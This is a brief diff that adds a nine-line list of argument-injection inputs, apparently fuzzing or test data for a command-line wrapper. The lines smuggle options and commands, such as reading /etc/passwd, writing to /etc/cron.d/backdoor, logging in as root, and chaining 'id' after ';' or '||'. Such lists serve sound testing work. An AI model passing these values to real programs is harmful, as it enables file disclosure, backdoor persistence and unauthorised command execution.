@@ -1,0 +1,9 @@
+-u root
+--config=/etc/passwd
+ -o /tmp/pwn
+--output=/etc/cron.d/backdoor
+; --help
+ || id
+--load-data-local-infile=/etc/passwd
+-e 'id'
+--exec='id'
